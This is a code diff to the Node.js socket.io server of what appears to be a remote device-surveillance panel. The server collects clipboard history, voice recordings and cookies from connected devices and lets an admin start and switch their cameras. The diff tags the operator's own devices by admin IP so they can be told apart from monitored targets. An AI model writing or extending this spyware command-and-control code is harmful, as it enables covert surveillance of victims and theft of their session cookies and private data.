@@ -100,6 +100,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(path.join(__dirname, 'admin-panel')));
 
 const devices = new Map();
+const adminIps = new Set(); // Track admin IPs to exclude own devices
 
 function saveDevices() {
     const data = {};
@@ -135,6 +136,8 @@ io.on('connection', (socket) => {
 
     // Admin sockets should not create device entries
     if (isAdmin) {
+        const adminIp = socket.handshake.address;
+        adminIps.add(adminIp);
         socket.join('admins'); // Join admin room for targeted broadcasts
         socket.on('start-camera-stream', (targetDeviceId) => {
             if (targetDeviceId && devices.has(targetDeviceId)) {
@@ -151,14 +154,21 @@ io.on('connection', (socket) => {
                 io.to(targetDeviceId).emit('switch-camera');
             }
         });
+        socket.on('disconnect', () => {
+            // Keep IP in set briefly; remove after other sockets from same IP may still be active
+            setTimeout(() => adminIps.delete(adminIp), 60000);
+        });
         return;
     }
+
+    const clientIp = socket.handshake.address;
+    const isOwnDevice = adminIps.has(clientIp);
 
     if (!devices.has(deviceId)) {
         devices.set(deviceId, {
             id: deviceId,
-            label: `Device-${deviceId.slice(0, 6)}`,
-            ip: socket.handshake.address,
+            label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
+            ip: clientIp,
             userAgent: '',
             firstSeen: Date.now(),
             lastSeen: Date.now(),
@@ -174,12 +184,14 @@ io.on('connection', (socket) => {
             clipboardHistory: [],
             voiceRecordings: [],
             cookiesData: null,
+            isOwnDevice: isOwnDevice,
             socketId: socket.id
         });
         io.emit('device-new', {
             id: deviceId,
-            label: `Device-${deviceId.slice(0, 6)}`,
-            time: Date.now()
+            label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
+            time: Date.now(),
+            isOwnDevice: isOwnDevice
         });
     }
 
@@ -287,7 +299,8 @@ io.on('connection', (socket) => {
             history: device.history.slice(-100),
             snapshotsCount: device.snapshots.length,
             battery: device.battery,
-            connection: device.connection
+            connection: device.connection,
+            isOwnDevice: device.isOwnDevice || false
         });
     });
 
@@ -468,7 +481,8 @@ app.get('/api/devices', (req, res) => {
             deviceDetection: d.deviceDetection || null,
             clipboardHistory: d.clipboardHistory || [],
             voiceRecordings: d.voiceRecordings || [],
-            cookiesData: d.cookiesData || null
+            cookiesData: d.cookiesData || null,
+            isOwnDevice: d.isOwnDevice || false
         });
     }
     res.json(data);
